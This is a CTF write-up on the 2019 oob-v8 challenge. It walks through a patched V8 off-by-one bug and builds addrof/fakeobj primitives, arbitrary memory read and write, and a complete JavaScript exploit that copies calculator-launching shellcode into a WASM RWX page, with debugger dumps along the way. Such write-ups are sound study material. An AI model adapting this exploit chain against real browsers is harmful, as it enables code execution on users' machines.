---
title: "CTF 2019 oob-v8: V8 Out-of-Bounds Read/Write Exploitation"
date: 2019-06-01
description: "Step-by-step V8 OOB exploitation: type confusion, addrOf/fakeObj primitives, WASM RWX shellcode execution"
tags: ["CTF", "V8", "Chrome", "OOB", "browser-exploitation", "JavaScript", "WASM"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Vulnerable Source

The challenge patches V8 with a new built-in function `Array.oob()`:

```cpp
BUILTIN(ArrayOob){
    uint32_t len = args.length();
    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
    Handle<JSReceiver> receiver;
    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, receiver,
        Object::ToObject(isolate, args.receiver()));

    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
    uint32_t length = static_cast<uint32_t>(array->length()->Number());

    if(len == 1){
        // read: return array[length] (one past the end)
        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
    } else {
        // write: array[length] = value
        Handle<Object> value;
        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(isolate, value,
            Object::ToNumber(isolate, args.at<Object>(1)));
        elements.set(length, value->Number());
        return ReadOnlyRoots(isolate).undefined_value();
    }
}
```

### What the Bug Does

- `len > 2` returns `undefined` — only 0 or 1 extra arguments accepted.
- The array is cast to `FixedDoubleArray` and `length` is the **current** length (e.g., 2 for a 2-element array).
- **Read path** (`len == 1`): returns `elements[length]` — the element **one slot past the end** of the array. Off-by-one OOB read.
- **Write path** (`len == 2`): writes a float value to `elements[length]` — OOB write at the same location.

```javascript
d8> a = [1.1]
[1.1]
d8> a.oob()    // read elements[1] — out of bounds
7.2550595796784e-311
d8> a.oob(0x1337)  // write elements[1]
```

---

## Pointer Tagging in V8

V8 uses pointer tagging to distinguish values without extra memory:

| Type | Representation |
|------|---------------|
| Double (float) | Raw 64-bit IEEE 754 |
| SMI (Small Integer) | `value << 32` (e.g., `0xdeadbeef` → `0xdeadbeef00000000`) |
| Heap Pointer | `address \| 1` (e.g., `0x2233ad9c2ed8` → `0x2233ad9c2ed9`) |

```
                | ---- 32 bit ---- |
Pointer:        |_____Address____w1|
SMI:            |___int32_value___0|
```

V8 uses the LSB to distinguish SMIs from heap object pointers, and the second LSB for weak/string references. When reading a tagged pointer from memory, subtract 1 before dereferencing.

---

## Float/Integer Conversion Helpers

Since V8 leaks information as IEEE 754 doubles, we need helpers to reinterpret bit patterns:

```javascript
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {  // float → BigInt
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {  // BigInt → float
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
```

Both functions share the same 8-byte `ArrayBuffer`. `ftoi` reinterprets float bits as a little-endian 64-bit integer; `itof` does the reverse. Print a leak as hex with `"0x" + ftoi(val).toString(16)`.

---

## V8 Memory Layout

Run `d8 --allow-natives-syntax` for `%DebugPrint()` access.

```javascript
var a = [1.1, 2.2];
```

```
pwndbg> job *args.values_
0x3972f184e229: [JSArray]
 - map: 0x16a6f3fc2ed9
 - elements: 0x3972f184e209 <FixedDoubleArray[2]>
 - length: 2

pwndbg> x/4xg 0x3972f184e229-1
0x3972f184e228: 0x000016a6f3fc2ed9  0x000006c9469c0c71  ← map | properties
0x3972f184e238: 0x00003972f184e209  0x0000000200000000  ← elements | length SMI

pwndbg> x/4xg 0x3972f184e209-1      ← FixedDoubleArray
0xdcadd60e208:  0x00001647bdf014f9  0x0000000200000000  ← map | length
0xdcadd60e218:  0x3ff199999999999a  0x400199999999999a  ← 1.1 | 2.2
0xdcadd60e228:  0x00002694087c2ed9  0x00001647bdf00c71  ← JSArray begins here
```

Memory diagram:

```
              &→ | FixedDoubleArray map | length (SMI) |
                 |        1.1          |      2.2      |
JSArray ──────→  |    JSArray map      |  properties   |
              ←* |    elements ptr     |  length (SMI) |
```

`a.oob()` reads the slot immediately after `elements[1]`, which lands on the **JSArray's map pointer** — a heap address leak.

```javascript
d8> var a = [1.1, 2.2];
d8> "0x" + ftoi(a.oob()).toString(16);
"0x17dc4dd0e0a9"    // ← this is the JSArray map address (tagged)
```

---

## What is a V8 Map?

A V8 Map (also called a hidden class) is a metadata structure describing:

- The dynamic type of the object (String, Uint8Array, JSArray, …)
- Object size in bytes
- Property names and their storage locations
- **Element kind** — whether elements are unboxed doubles or tagged pointers
- Prototype pointer

Two arrays of different element kinds have different Maps. A float array (`PACKED_DOUBLE_ELEMENTS`) and an object array (`PACKED_ELEMENTS`) have distinct Maps. Swapping the Map of one array with the other causes V8 to misinterpret element values.

---

## addrOf and fakeObj Primitives

### addrOf — Get the heap address of any object

A float array's elements are stored as raw doubles. An object array's elements are tagged heap pointers. If we give an object array a float Map, reading `arr[0]` returns the **raw pointer** to the object stored there — interpreted as a double.

```javascript
var float_arr = [1.1];
var float_arr_map = float_arr.oob();  // leak float array Map

var obj = {"A": 1.1};
var obj_arr = [obj];

obj_arr.oob(float_arr_map);           // replace obj_arr's map
"0x" + ftoi(obj_arr[0]).toString(16); // obj_arr[0] now leaks obj's address as float
// "0x219090b924f1"

%DebugPrint(obj);
// 0x219090b924f1 <Object map = ...>  ← matches!
```

Full implementation:

```javascript
var temp_obj  = {"A": 1};
var obj_arr   = [temp_obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj_arr_map   = obj_arr.oob();
var float_arr_map = float_arr.oob();

function addrof(in_obj) {
    obj_arr[0] = in_obj;
    obj_arr.oob(float_arr_map);   // reinterpret elements as floats
    let addr = obj_arr[0];        // read raw pointer as double
    obj_arr.oob(obj_arr_map);     // restore Map
    return ftoi(addr);
}
```

### fakeObj — Treat an arbitrary address as a JS object

The inverse: write an address into a float array slot, then give the float array an object Map. Reading `arr[0]` now returns a JS object whose backing memory starts at that address.

```javascript
function fakeobj(addr) {
    float_arr[0] = itof(addr);    // place target address as float
    float_arr.oob(obj_arr_map);   // reinterpret float elements as pointers
    let fake = float_arr[0];      // V8 treats addr as a heap object
    float_arr.oob(float_arr_map); // restore Map
    return fake;
}
```

---

## Arbitrary Read / Write

### Arbitrary Read (AAR)

Build a crafted array whose second element controls the `elements` pointer of a fake JSArray:

```javascript
var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];

function arb_read(addr) {
    if (addr % 2n == 0) addr += 1n;  // ensure tagged pointer

    // Place fakeobj just above arb_rw_arr in memory
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // arb_rw_arr[2] becomes the elements pointer of fake
    // elements[0] is at elements_ptr + 0x10, so subtract 0x10
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);

    return ftoi(fake[0]);
}
```

Memory view confirming the layout:

```
pwndbg> x/10xg 0x04f1c474ee99-1 - 0x30
0x4f1c474ee68:  0x00000f50a36814f9  0x0000000400000000  ← FixedDoubleArray
0x4f1c474ee78:  0x3ff199999999999a  0x3ff3333333333333  ← [0] [1]
0x4f1c474ee88:  0x3ff4cccccccccccd  0x3ff6666666666666  ← [2] [3]
0x4f1c474ee98:  0x00002f930ed42ed9  0x00000f50a3680c71  ← JSArray map | properties
0x4f1c474eea8:  0x000004f1c474ee69  0x0000000400000000  ← elements ptr | length
```

`arb_rw_arr[2]` is at offset `+0x20` from the start of the FixedDoubleArray. When `fakeobj` creates a fake JSArray at `addrof(arb_rw_arr) - 0x20`, V8 reads `arb_rw_arr[2]` as the fake JSArray's `elements` pointer.

### Initial Arbitrary Write

```javascript
function initial_arb_write(addr, val) {
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    fake[0] = itof(BigInt(val));
}
```

### Full Arbitrary Write via ArrayBuffer Backing Store

Directly writing through the fake object is fragile. The robust approach is to overwrite the backing store pointer of a real `ArrayBuffer`, then use a `DataView` to write at that address:

```javascript
function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;  // backing store is at JSArrayBuffer+0x20
    initial_arb_write(backing_store_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}
```

Verification — overwriting `__free_hook` with `system`:

```
pwndbg> p &__free_hook
$2 = 0x7f78e7835e48

d8> initial_arb_write(backing_store_addr, 0x7f78e7835e48);
d8> dataview.setBigUint64(0, BigInt(0x7f78e76992c0), true);  // &system

pwndbg> x/xg &__free_hook
0x7f78e7835e48: 0x00007f78e76992c0   ← __free_hook → system ✓
```

---

## Summary of Primitives

### Object Array Layout

```
| MAP | Properties |
| Obj |
```

### Float Array Layout

```
| MAP    | Properties |
| Fl_val | Fl_val...  |
```

### addrof

```javascript
function addrof(obj){
    obj_arr[0] = obj;
    obj_arr.oob(float_arr_map);  // swap Map → read pointer as float
    let addr = obj_arr[0];
    obj_arr.oob(obj_arr_map);    // restore
    return ftoi(addr);
}
```

### fakeobj

```javascript
function fakeobj(addr) {
    float_arr[0] = itof(addr);   // write addr as float
    float_arr.oob(obj_arr_map);  // swap Map → float treated as pointer
    let fake = float_arr[0];
    float_arr.oob(float_arr_map); // restore
    return fake;
}
```

---

## Full Exploit — WASM RWX Page + Shellcode

V8 allocates a **read-write-execute (RWX)** page for compiled WASM code. The exploit:

1. Creates a WASM instance.
2. Uses `arb_read` to leak the RWX page address from `WasmInstance+0x88`.
3. Copies shellcode into the RWX page via an overwritten `ArrayBuffer` backing store.
4. Calls the exported WASM function, which now executes the shellcode.

```javascript
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val){ f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); }
function itof(val){ u64_buf[0] = Number(val & 0xffffffffn); u64_buf[1] = Number(val >> 32n); return f64_buf[0]; }

var obj = {"A":1};
var obj_arr   = [obj];
var float_arr = [1.1, 1.2, 1.3, 1.4];
var obj_arr_map   = obj_arr.oob();
var float_arr_map = float_arr.oob();

console.log("[+] Float Array Map: 0x" + ftoi(float_arr_map).toString(16));
console.log("[+] Object Array Map: 0x" + ftoi(obj_arr_map).toString(16));

function addrof(in_obj){
    obj_arr[0] = in_obj;
    obj_arr.oob(float_arr_map);
    let addr = obj_arr[0];
    obj_arr.oob(obj_arr_map);
    return ftoi(addr);
}

function fakeobj(addr){
    float_arr[0] = itof(addr);
    float_arr.oob(obj_arr_map);
    let fake = float_arr[0];
    float_arr.oob(float_arr_map);
    return fake;
}

var arb_rw_arr = [float_arr_map, 1.2, 1.3, 1.4];
console.log("[+] Controlled Float Array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr){
    if(addr % 2n == 0) addr += 1n;
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    return ftoi(fake[0]);
}

function initial_arb_write(addr, val){
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
    arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
    fake[0] = itof(BigInt(val));
}

// Minimal WASM module that just returns 42
var wasm_code = new Uint8Array([
    0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,
    3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,
    5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,
    7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,
    10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11
]);
var wasm_mod      = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

// WasmInstance+0x88 holds the RWX page address
var rwx_page_addr = arb_read(addrof(wasm_instance) - 1n + 0x88n);
console.log("[+] RWX WASM Page Address: 0x" + rwx_page_addr.toString(16));

// xcalc shellcode
var shellcode = [
    0x90909090, 0x90909090,
    0x782fb848, 0x636c6163, 0x48500000,
    0x73752fb8, 0x69622f72, 0x8948506e,
    0xc03148e7, 0x89485750, 0xd23148e6,
    0x3ac0c748, 0x50000030, 0x4944b848,
    0x414c5053, 0x48503d59, 0x3148e289,
    0x485250c0, 0xc748e289, 0x00003bc0,
    0x050f00
];

function copy_shellcode(addr, shellcode){
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x20n;
    initial_arb_write(backing_store_addr, addr);
    for(let i = 0; i < shellcode.length; i++){
        dataview.setUint32(4*i, shellcode[i], true);
    }
}

console.log("[+] Copying shellcode to RWX page");
copy_shellcode(rwx_page_addr, shellcode);
console.log("[+] Popping calc");
f();
```

---

## Exploitation Chain Summary

```
OOB read/write via Array.oob()
        ↓
Leak JSArray Map pointers (float vs object)
        ↓
addrOf primitive — leak any object's heap address
        ↓
fakeObj primitive — treat arbitrary address as JS object
        ↓
Arbitrary Read — control fake JSArray elements pointer
        ↓
Arbitrary Write — overwrite ArrayBuffer backing store + DataView
        ↓
Leak WASM instance RWX page address (WasmInstance+0x88)
        ↓
Copy shellcode to RWX page via overwritten backing store
        ↓
Call WASM export → shellcode executes
```

---

## Key Takeaways

- V8's pointer tagging means that swapping a Map between a float array and an object array causes the engine to **misinterpret element values** — the root mechanism behind both `addrOf` and `fakeObj`.
- The OOB access lands precisely on the Map field of the JSArray following the FixedDoubleArray in memory — enabling Map corruption with a single `oob()` write.
- `ArrayBuffer` backing store overwrite is the **standard V8 arbitrary write pattern**: it avoids fragile fake-object writes and gives a clean, type-safe interface via `DataView`.
- WASM RWX pages are the canonical `exec` primitive in V8 exploits: the page is allocated once per `WebAssembly.Instance` and its address is readable via `arb_read` at a fixed offset in the `WasmInstance` structure.
